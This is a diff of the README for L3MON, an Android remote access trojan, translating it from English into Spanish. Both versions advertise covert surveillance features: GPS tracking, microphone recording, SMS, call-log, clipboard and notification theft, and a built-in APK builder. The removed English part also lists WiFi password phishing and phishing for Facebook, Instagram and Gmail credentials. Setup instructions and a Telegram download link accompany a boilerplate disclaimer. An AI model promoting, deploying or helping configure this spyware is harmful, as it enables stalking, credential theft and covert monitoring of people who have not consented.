@@ -1,115 +1,88 @@
 # L3MON 
 </p>
-<p> We as <a href="https://t.me/deVL33014">DeVL3</a> are pleased to unveil L3MON, an improved iteration of our tool. Kindly peruse the following sections to acquaint yourself with the tool's functionalities and capabilities. L3MON RAT, as modified by l3mon2024, stands as one of the most potent Remote Access Trojans (RATs) equipped with a sophisticated web-based control panel. </p>
-
-# <a href="https://t.me/deVL33014">L3MON UPDATE</a>:
-- Real-time SCREEN Viewer
-- SCREENSHOT Capture
-- File upload and download Capabilities
-- WiFI password Phishing
-- Facebook, Instagram, and Gmail credentials Phishing
-- BACKGROUND SERVICE available 24/7
-- No requirement for PORT FORWARDING (FREE VPS LOGIN PANEL)
-- screen unlock (soon)
-
-# <a href="https://t.me/deVL33014">L3MON FREE UPDATE</a>:
-- GPS Logging
-- Microphone Recording
-- Viewing Contacts
-- SMS Logs
-- Sending SMS
-- Call Logs
-- Viewing Installed Apps
-- Inspecting Stub Permissions
-- Live Clipboard Logging
-- Live Notification Logging
-- Viewing WiFi Networks (including logs of previously accessed networks)
-- File Explorer & Downloader
-- Command Queuing
-- Built-In APK Builder
-- Autorun (contact to setup for free)
 
 
-# L3MON- basic Features
-- GPS Logging
-- Microphone Recording
-- View Contacts
-- SMS Logs
-- Send SMS
-- Call Logs
-- View Installed Apps
-- View Stub Permissions
-- Live Clipboard Logging
-- Live Notification Logging
-- View WiFi Networks (logs previously seen)
-- File Explorer & Downloader
-- Command Queuing
-- Built In APK Builder
+# <a">ACTUALIZACIÓN GRATUITA DE L3MON</a>:
+- Registro GPS
+- Grabación de micrófono
+- Visualización de contactos
+- Registros de SMS
+- Envío de SMS
+- Registros de llamadas
+- Visualización de aplicaciones instaladas
+- Inspección de permisos de Stub
+- Visualización de redes WiFi (incluidos registros de redes previamente accedidas)
+- Explorador de archivos y descargador
+- Cola de comandos
+- Constructor de APK incorporado
+- Autorun (contactar para configurar de forma gratuita)
 
-## Prerequisites 
+
+
+## Requisitos previos 
  - Java Runtime Environment 8
-    - See [installation](#Installation) for OS specifics
+    - Consulta [instalación](#Instalación) para detalles específicos del sistema operativo
  - NodeJs 
- - A Server
+ - Un servidor
 
-## Installation 
-1. Install JRE 8
+## Instalación 
+1. Instala JRE 8
 
 
-2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you encounter difficulties comprehending these instructions, it is advisable to reconsider your suitability for utilizing this tool.)
+2. Instala NodeJS [Instrucciones aquí](https://nodejs.org/en/download/package-manager/) (Si tienes dificultades para comprender estas instrucciones, es recomendable reconsiderar tu idoneidad para utilizar esta herramienta.)
 
-3. install PM2 
+3. Instala PM2 
     - `npm install pm2 -g`
     - `npm install`
     - `npm audit fix`
     - `npm audit`
 
-4. Download and Extract the latest release from [HERE](https://t.me/deVL33014)
+4. Descarga y extrae la última versión desde [AQUÍ](https://t.me/deVL33014)
 
-5. In the extracted folder, run these commands
-    - `npm install` <- install dependencies
-    - `pm2 start index.js` <-- start the script
-    - `pm2 startup` <- to run L3MON on startup
+5. En la carpeta extraída, ejecuta estos comandos
+    - `npm install` <- instala las dependencias
+    - `pm2 start index.js` <-- inicia el script
+    - `pm2 startup` <- para ejecutar L3MON al inicio
 
-6. Set a Username & Password
-    1. Stop L3MON `pm2 stop index`
-    2. Open `maindb.json` in a text editor
-    3. MD5 Hash `echo -n deVL33014 | openssl md5|awk '{print $2}'`
-    4. under `admin` 
-        - set the `username` as plain text
-        - set the `password` as a LOWERCASE MD5 hash
-    4. save the file
-    5. run 
-        - pm2 restart all`
+6. Establece un nombre de usuario y contraseña
+    1. Detén L3MON `pm2 stop index`
+    2. Abre `maindb.json` en un editor de texto
+    3. Hash MD5 `echo -n deVL33014 | openssl md5|awk '{print $2}'`
+    4. Bajo `admin` 
+        - establece el `nombre de usuario` como texto plano
+        - establece la `contraseña` como un hash MD5 en minúsculas
+    4. Guarda el archivo
+    5. Ejecuta 
+        - `pm2 restart all`
 
-7. in your browser navigate to 
+7. En tu navegador, accede a 
         - `http://127.0.0.1:22533`
 
-## Notes
-When opening an issue, you **MUST** use the provided templates. Issues without this will not receive support quickly and will be put to the bottom of the figurative pile.
+## Notas
+Cuando abras un problema, DEBES usar las plantillas proporcionadas. Los problemas sin esto no recibirán soporte rápidamente y se pondrán al final de la pila figurativa.
 
-Please have a look through the current issues, open and closed to see if your issue has been addressed before. If it's java related, it's most definitely been addressed - In short Use Java 1.8.0
+Por favor, revisa los problemas actuales, tanto abiertos como cerrados, para ver si tu problema ya ha sido abordado. Si está relacionado con Java, definitivamente ya ha sido abordado. En resumen, utiliza Java 1.8.0.
 
-## Disclaimer
-- The L3MON is a software application designed for legitimate and ethical purposes of security and research. It is essential to understand and agree to the following terms and conditions before using this tool:
+## Descargo de responsabilidad
+- L3MON es una aplicación de software diseñada para propósitos legítimos y éticos de seguridad e investigación. Es esencial comprender y aceptar los siguientes términos y condiciones antes de utilizar esta herramienta:
 
-- Legal and Ethical Use: Users are strictly prohibited from using L3MON for any illegal, unethical, or harmful activities. This includes, but is not limited to, unauthorized access to mobile systems, data theft, harassment, or any activity that violates local, national, or international laws.
+- Uso legal y ético: Se prohíbe estrictamente a los usuarios utilizar L3MON para actividades ilegales, no éticas o perjudiciales. Esto incluye, pero no se limita a, el acceso no autorizado a sistemas móviles, robo de datos, acoso o cualquier actividad que viole las leyes locales, nacionales o internacionales.
 
-- Ownership and Responsibility: The developers and providers of L3MON disclaim any responsibility for the misuse of this tool. Users are solely responsible for their actions and should use L3MON only in compliance with applicable laws and ethical standards.
+- Propiedad y responsabilidad: Los desarrolladores y proveedores de L3MON renuncian a cualquier responsabilidad por el mal uso de esta herramienta. Los usuarios son los únicos responsables de sus acciones y deben usar L3MON solo cumpliendo con las leyes aplicables y los estándares éticos.
 
-- Consent and Privacy: It is the user's responsibility to obtain explicit consent from individuals whose devices or data may be accessed or monitored using L3MON. Invasion of privacy or unauthorized access to personal information is strictly prohibited.
+- Consentimiento y privacidad: Es responsabilidad del usuario obtener el consentimiento explícito de las personas cuyos dispositivos o datos pueden ser accesados o monitoreados mediante L3MON. Se prohíbe estrictamente la invasión de la privacidad o el acceso no autorizado a información personal.
 
-- No Warranty: L3MON is provided "as is," without any warranties, express or implied. The developers make no guarantees regarding its performance, reliability, or suitability for any particular purpose.
+- Sin garantía: L3MON se proporciona "tal cual", sin garantías expresas o implícitas. Los desarrolladores no ofrecen garantías sobre su rendimiento, confiabilidad o idoneidad para un propósito particular.
 
-- Educational and Research Purposes: L3MON may be used for educational and research purposes by professionals, cybersecurity experts, and ethical hackers. However, even in these cases, it should be used responsibly and in accordance with applicable laws and regulations.
+- Fines educativos e investigación: L3MON puede ser utilizado con fines educativos e investigativos por profesionales, expertos en ciberseguridad y hackers éticos. Sin embargo, incluso en estos casos, debe utilizarse de manera responsable y de acuerdo con las leyes y regulaciones aplicables.
 
-- Documentation and Reporting: Users are encouraged to maintain clear and accurate documentation of their activities when using L3MON. Any vulnerabilities or issues discovered should be reported to the appropriate parties promptly.
+- Documentación e informes: Se recomienda a los usuarios mantener una documentación clara y precisa de sus actividades al utilizar L3MON. Cualquier vulnerabilidad o problema descubierto debe informarse a las partes correspondientes de inmediato.
 
-- User Discretion: Users are advised to exercise discretion and caution when using L3MON to avoid any unintended consequences, legal troubles, or damage to individuals, organizations, or systems.
+- Discreción del usuario: Se aconseja a los usuarios que ejerzan discreción y precaución al utilizar L3MON para evitar consecuencias no deseadas, problemas legales o daños a personas, organizaciones o sistemas.
 
-- By using L3MON, you acknowledge that you have read and understood these terms and conditions and agree to abide by them. Any misuse or violation of these terms may result in legal consequences.
+- Al utilizar L3MON, reconoces que has leído y entendido estos términos y condiciones, y aceptas cumplir con ellos. Cualquier mal uso o violación de estos términos puede resultar en consecuencias legales.
 
-- L3MON is a powerful tool that should be used responsibly and ethically. Failure to do so may result in legal action and damage to your reputation.
+- L3MON es una herramienta poderosa que debe utilizarse de manera responsable y ética. No hacerlo puede resultar en acciones legales y daño a tu reputación.
 
 ## Thanks
 L3MON Builds off and utilizes several opensource software, Without these, L3MON Wouldn't be what it is!
